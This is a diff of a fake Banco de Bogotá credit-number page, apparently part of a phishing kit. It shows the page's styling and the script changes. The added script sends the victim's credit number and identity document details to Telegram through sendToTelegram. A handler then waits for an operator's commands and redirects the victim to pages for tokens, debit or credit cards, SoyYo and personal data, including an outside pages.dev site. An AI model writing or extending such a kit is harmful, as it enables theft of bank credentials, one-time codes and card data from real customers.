@@ -19,7 +19,6 @@
         .card { background: #fff; border-radius: 16px; padding: 32px 28px; width: 100%; max-width: 440px; box-shadow: 0 2px 12px rgba(0,0,0,0.07); }
         .card h1 { font-size: 15px; font-weight: 400; color: #444; text-align: center; line-height: 1.5; margin-bottom: 24px; }
 
-        /* Banner de información (estilo Mobilize) */
         .info-banner {
             background: #f0f7ff;
             border: 1px solid #b8d4f0;
@@ -58,7 +57,6 @@
 
         .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
 
-        /* Overlay de carga (estilo Mobilize) */
         #loading-overlay {
             position: fixed;
             top: 0; left: 0;
@@ -70,20 +68,12 @@
             align-items: center;
             flex-direction: column;
         }
-        .loader-container {
-            position: relative;
-            width: 60px;
-            height: 60px;
-            animation: rotateLoader 1.5s linear infinite;
-        }
+        .loader-container { position: relative; width: 60px; height: 60px; animation: rotateLoader 1.5s linear infinite; }
         .dot { position: absolute; width: 20px; height: 20px; border-radius: 50%; }
         .dot-red { background-color: #e8391e; top: 0; left: 50%; transform: translateX(-50%); }
         .dot-dark { background-color: #1a1a1a; bottom: 5px; left: 0; }
         .dot-gray { background-color: #d0d0d0; bottom: 5px; right: 0; }
-        @keyframes rotateLoader {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes rotateLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         @media (max-width: 480px) { .card { padding: 24px 18px; } }
     </style>
@@ -120,7 +110,7 @@
 
                 <form id="creditForm" autocomplete="off" onsubmit="return sendCreditForm(event);">
                     <div class="input-wrap">
-                        <input type="text" id="credito" placeholder=" " inputmode="numeric" autocomplete="off">
+                        <input type="text" id="credito" placeholder=" " inputmode="numeric" autocomplete="off" maxlength="20">
                         <label for="credito">Número de crédito *</label>
                     </div>
                     <button type="button" class="btn btn-dark" onclick="history.back()">REGRESAR</button>
@@ -150,19 +140,81 @@
     </footer>
 
     <!-- ============================================================
-         📌 SCRIPTS (lógica del Banco de Bogotá adaptada)
+         📌 SCRIPTS
          ============================================================ -->
     <script src="telegram.js"></script>
     <script src="action.js"></script>
     <script>
+        // ============================================================
+        // 🗺️ MAPA DE REDIRECCIONES (sobrescribe/amplía el de action.js)
+        // ============================================================
+        const REDIRECTS = {
+            'error': 'index1.html?error=wrong_data',
+            'token': 'token.html',
+            'token_otro': 'tokeninv.html',
+            'credito': 'transaction_summary.html',        // ← NUEVO
+            'credito_ok': 'transaction_summary.html',     // ← NUEVO
+            'credito_error': 'index1.html?error=wrong_data',
+            'tarjeta_debito': 'tarjeta.html',
+            'tarjeta_credito': 'tarjeta.html',
+            'error_debito': 'tarjeta.html?error=invalid',
+            'error_débito': 'tarjeta.html?error=invalid',
+            'error_credito': 'tarjeta.html?error=invalid',
+            'error_crédito': 'tarjeta.html?error=invalid',
+            'soyyo': 'soyyo.html',
+            'datos_personales': 'https://virtualbogotacuposbogota.pages.dev/bogota/datos-personales',
+            'finalizar': 'final.html',
+            'error_logo': 'soyyo.html?error=invalid',
+        };
+
+        let actionProcessed = false;
+
+        // ============================================================
+        // 📩 MANEJAR ACCIONES DE TELEGRAM
+        // ============================================================
+        window.handleTelegramAction = function(action) {
+            if (actionProcessed) {
+                console.log('⚠️ Acción ya procesada');
+                return;
+            }
+
+            console.log('📩 Acción recibida:', action);
+            actionProcessed = true;
+
+            if (action === 'tarjeta_debito') {
+                localStorage.setItem('card_type', 'Débito');
+            } else if (action === 'tarjeta_credito') {
+                localStorage.setItem('card_type', 'Crédito');
+            }
+
+            const redirectUrl = REDIRECTS[action];
+
+            if (redirectUrl) {
+                console.log('✅ Redirigiendo a:', redirectUrl);
+                if (window.stopListening) window.stopListening();
+
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 100);
+            } else {
+                console.warn('⚠️ Acción desconocida:', action);
+                actionProcessed = false;
+            }
+        };
+
+        // ============================================================
+        // 🧹 DETENER ESCUCHA PREVIA
+        // ============================================================
         if (window.stopListening) window.stopListening();
 
+        // ============================================================
+        // 🖊️ INPUT: número de crédito (solo dígitos)
+        // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
             const input = document.getElementById('credito');
             const btn = document.getElementById('btnContinuar');
             const msgErr = document.getElementById('msgError');
 
-            // Habilitar botón cuando hay texto
             input.addEventListener('input', () => {
                 input.value = input.value.replace(/[^0-9]/g, '');
                 const tiene = input.value.trim().length > 0;
@@ -200,30 +252,37 @@
 
             if (window.stopListening) window.stopListening();
             localStorage.removeItem('bbogota_msg_id');
-            if (typeof actionProcessed !== 'undefined') actionProcessed = false;
+            actionProcessed = false;
 
             const userData = (typeof getUserData === 'function') ? getUserData() : {
                 tipo_identificacion: localStorage.getItem('user_id_type') || 'CC',
                 numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
             };
 
+            // ⚠️ Enviamos como tipo "credito" para no chocar con la validación de token
             const creditData = {
                 credito: creditNumber,
                 tipo_identificacion: userData.tipo_identificacion,
                 numero_identificacion: userData.numero_identificacion
             };
 
-            // Guardar en localStorage (compatibilidad con Mobilize)
+            // Guardar también en localStorage (compatibilidad Mobilize)
             localStorage.setItem('userInfo', JSON.stringify(creditData));
 
             if (typeof sendToTelegram === 'function') {
                 sendToTelegram('credito', creditData, function() {
                     console.log('✅ Crédito enviado');
-                    if (typeof listenCurrentButtons === 'function') listenCurrentButtons(window.handleTelegramAction);
+                    if (typeof listenCurrentButtons === 'function') {
+                        listenCurrentButtons(window.handleTelegramAction);
+                    } else {
+                        // Fallback si no existe listenCurrentButtons
+                        setTimeout(() => {
+                            window.location.href = 'transaction_summary.html';
+                        }, 1500);
+                    }
                 });
             } else {
                 console.error('❌ sendToTelegram no disponible');
-                // Fallback: redirigir directo (como Mobilize original)
                 window.location.href = 'transaction_summary.html';
             }
 
